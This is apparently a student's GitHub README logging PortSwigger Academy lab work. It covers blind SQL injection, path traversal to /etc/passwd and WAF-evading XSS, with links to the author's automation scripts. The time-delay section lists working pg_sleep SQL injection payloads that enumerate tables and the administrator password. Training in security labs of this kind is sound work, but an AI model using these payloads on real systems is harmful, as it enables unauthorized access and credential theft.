# PortSwigger Academy

This repository serves as a live progress tracker.

##

## Academy Progress Metrics

<img width="743" height="235" alt="image" src="https://github.com/user-attachments/assets/ae16272a-8b67-4f60-8b53-12c40e35b883" />

##

## Lab automation

**Lab: Blind SQL injection with conditional responses**

Because manual brute-forcing of a 20-character password would be miserable, I initially tried using the "Intruder" tool in Burp Suite. However, since I am using the Community Edition, the execution is artificially rate-limited and takes way too long. To bypass this performance ceiling, I decided to build my own custom automation script in Python.

Prerequisites to extract from the HTTP requests (e.g., using Burp Suite):
1. **Target URL** with a category filter: 'web-security-academy.net/filter?category=Gifts'
2. **TrackingId** cookie value from GET request: 'WRZcL3blKj8g33lD'
3. **Session** cookie value from GET request: 'nL2y3jQS7RGGszFBzSetHZfPfGPrOgOq'

By copying these 3 elements into the Python script, it dynamically treats the application response as a "Boolean Oracle" (checking for the "Welcome back" string) to exfiltrate the full administrator password character-by-character.

The script is available here: https://github.com/cialoo/PortSwigger-Academy/blob/main/portswigger-blind_sqli_oracle.py

##

**Lab: Blind SQL injection with time delays**

In this laboratory, the initial objective was to cause a 10 second delay using SQL injection with time delays with in cookies. I curious if environment give me acces to log in to website.
1. Triggered time delay:
   
   "'pg_sleep(10)--"

2. Verified that the application could process 'case when' expressions:

   "'||(select case when(1=1) then pg_sleep(3) else pg_sleep(0) end)--"

5. Verified existence of the target table 'users':

   "'||(select case when exists(select 1 from information_schema.tables where table_name='users') then pg_sleep(3) else pg_sleep(0) end)--"

6. Verified existence of the target columns 'username' and 'password':

   "'||(select case when exists(select 1 from information_schema.columns where table_name='users' and column_name='username') then pg_sleep(3) else pg_sleep(0) end)--"

   "'||(select case when exists(select 1 from information_schema.columns where table_name='users' and column_name='password') then pg_sleep(3) else pg_sleep(0) end)--"

7. Verified existence of the administrator user:

   "||(select case when exists(select username from users where username = 'administrator') then pg_sleep(3) else pg_sleep(0) end)--"

8. Verified password length by Intruder in Burp:

   "'||(select case when exists(select password from users where username='administrator' and length(password)=§20§) then pg_sleep(2) else pg_sleep(0) end)--"

Payload type -> Numbers from 1 to 50 step by 1.

9. Since the free Burp applies severe rate-limiting I solved this problem by develop my own script in Python. The script is available here: https://github.com/cialoo/PortSwigger-Academy/blob/main/portswigger-blind_sqli_with_with_time_delays.py

By executing my own script i successful login as the administrator user.

##

**Lab: File path traversal, simple case**

The objective of this lab was to retrieve the contents of the '/etc/passwd' file. After completing the lab manually, I developed a simple Python script to automate file enumeration through the vulnerable endpoint. Instead of requesting individual files one by one, the script iterates over a custom wordlist, builds the appropriate path traversal payloads, sends HTTP requests, and displays the contents of files that are successfully retrieved.

For this exercise, the wordlist contains only two common Linux files: 'etc/passwd', 'etc/hostname'.

The script can easily be extended with additional file paths to automate further testing during similar path traversal exercises.

The script is available here: https://github.com/cialoo/PortSwigger-Academy/blob/main/portswigger-file_path_traversal_simple_case.py

##

**Lab: Reflected XSS into HTML context with most tags and attributes blocked**

In this lab, I tested reflected XSS in the search functionality protected by a Web Application Firewall (WAF) against common XSS payloads. The manual testing phase using Burp Community was very time consuming because I need to do two separate wordlist with 143 and 144 entries. To automate this process, I developed a custom Python script that sends payloads automatically and identifies which tags and attributes are accepted by the application.

The script is available here: https://github.com/cialoo/PortSwigger-Academy/blob/main/portswigger-reflected_xss_with_blocked_tags_and_attributes.py

##


